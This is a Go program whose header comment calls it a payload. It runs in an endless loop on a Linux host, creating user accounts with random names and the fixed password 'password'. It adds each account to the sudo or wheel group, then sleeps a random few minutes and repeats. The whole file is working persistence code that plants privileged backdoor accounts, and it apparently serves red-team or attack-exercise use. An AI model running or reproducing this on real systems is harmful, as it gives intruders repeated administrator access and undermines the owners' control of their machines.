//Michael Burke
//Payload to create random users at random intervals

package main

import (
	"fmt"
	"io/ioutil"
	"math/rand"
	"os"
	"os/exec"
	"strconv"
	"strings"
	"time"
)

var users []string
var password string
var currentOS string
var isDemo bool
var numUsers int
var isVerbose bool = false

func main() {
	args := os.Args
	currentOS = getOS()
	//Build global variables
	buildUsers()
	//Check args
	if len(args) > 1 {
		for i := 1; i < len(args); i++ {
			switch args[i] {
			case "--demo":
				isDemo = true
			case "-n":
				numUsers, _ = strconv.Atoi(args[i+1])
			case "--help", "-h":
				fmt.Println("User Creator\n\n" +
					"--demo		|	Displays users but does not create them\n" +
					"-n [num]	|	Generate n users (default: 2)\n" +
					"--help or -h	|	Display this help menu",
				)
				return
			case "-v":
				isVerbose = true
			}
		}
	}
	do()

}

func do() {
	//Check to see if /sbin or /usr/sbin is in path;
	osPath := os.Getenv("PATH")
	if strings.Index(osPath, "/sbin") == -1 {
		//If it isn't, add it so we can use usermod
		os.Setenv("PATH", osPath+":/sbin:/usr/sbin")
	}
	if isVerbose {
		fmt.Printf("Creating user\n")
	}
	//Create n number of users
	for i := 0; i < numUsers; i++ {
		//Pick a random name from the list
		index := random(len(users) - 1)
		username := users[index]
		//Append a random number to the username
		username = username + strconv.Itoa(random(99)) + strconv.Itoa(random(99))
		if isVerbose {
			fmt.Println(username)
		}
		if !isDemo {
			//Create the user and add them to sudoers
			createUser(username)
			addSudo(username)
			fmt.Println("Created user " + username)
		}
	}
	//Delay a random amount of time, then start again
	rand.Seed(time.Now().UnixNano())
	delay := (random(19) + 1) * 60
	if isVerbose {
		fmt.Printf("Sleeping for %d Minutes\n", delay/60)
	}
	time.Sleep(time.Duration(delay) * time.Second)
	do()
}

func getOS(isFail ...bool) string {
	var ret_os string
	checkID := false
	if len(isFail) > 0 && isFail[0] {
		checkID = true
	}
	//Read /etc/os-release to find what distro the host is running on
	os_str := readFile("/etc/os-release")
	os_split := strings.Split(os_str, "\n")
	for i := 0; i < len(os_split); i++ {
		//Child distros will have ID_LIKE instead of ID. Check for both
		matchString := "ID_LIKE="
		if checkID {
			matchString = "ID="
		}
		if strings.Index(os_split[i], matchString) == 0 {
			ret_os = strings.Replace(os_split[i], matchString, "", 1)
			ret_os = strings.Replace(ret_os, `"`, "", -1)
			break
		}
	}
	if ret_os == "" && !checkID {
		// If ID_LIKE wasn't found, then seach for ID= instead
		return getOS(true)
	}
	return ret_os
}

func addSudo(username string) {
	//Check to see if we need to add the user to the sudo group or the wheel group
	group := "sudo"
	if currentOS == "centos" || strings.Index(currentOS, "rhel") != -1 || strings.Index(currentOS, "fedora") != -1 {
		group = "wheel"
	}
	//Add user to the group
	cmd := exec.Command("usermod", "-aG", group, username)
	b, err := cmd.CombinedOutput()
	if err != nil && isVerbose {
		fmt.Println(err)
	}
	if isVerbose {
		fmt.Printf("%s\n", b)
	}
}

func createUser(username string) {
	//Use openssl to get a password hash
	cmd := exec.Command("openssl", "passwd", "-1", password)
	passwordBytes, err := cmd.CombinedOutput()
	if err != nil {
		panic(err)
	}
	//Remove whitespace (possibly a trailing newline)
	passwd := strings.TrimSpace(string(passwordBytes))
	//Add the user, setting the password hash
	cmd = exec.Command("useradd", "-p", passwd, username)
	b, err := cmd.CombinedOutput()
	if err != nil && isVerbose {
		fmt.Println(err)
	}
	if isVerbose {
		fmt.Printf("%s\n", b)
	}
}

func readFile(path string) string {
	dat, _ := ioutil.ReadFile(path)
	str := string(dat)
	return str
}

func random(n int) int {
	rand.Seed(time.Now().UnixNano())
	return rand.Intn(n)
}

func buildUsers() {
	//Build global variables
	numUsers = 2
	password = "password"
	users = []string{
		"Martin",
		"Nina",
		"Reuben",
		"Tamra",
		"Omar",
		"Jessie",
		"Wally",
		"Lora",
		"Bridgette",
		"Rosalind",
		"Jana",
		"Thad",
		"Thaddeus",
		"Andreas",
		"Otis",
		"Ida",
		"Valeria",
		"Lyle",
		"Nellie",
		"Sherri",
		"Bernardo",
		"Vernon",
		"Cornelia",
		"Barbara",
		"Sol",
		"Enrique",
		"Douglas",
		"Cordell",
		"Roberta",
		"Frieda",
		"Freida",
		"Quentin",
		"Hallie",
		"Damien",
		"Lea",
		"Deana",
		"Herman",
		"Emma",
		"Tyler",
		"Nita",
		"Leola",
		"Antione",
		"Horace",
		"Deann",
		"Oscar",
		"Michael",
		"Edwardo",
		"Hope",
		"Sheldon",
		"Rebecca",
	}
}
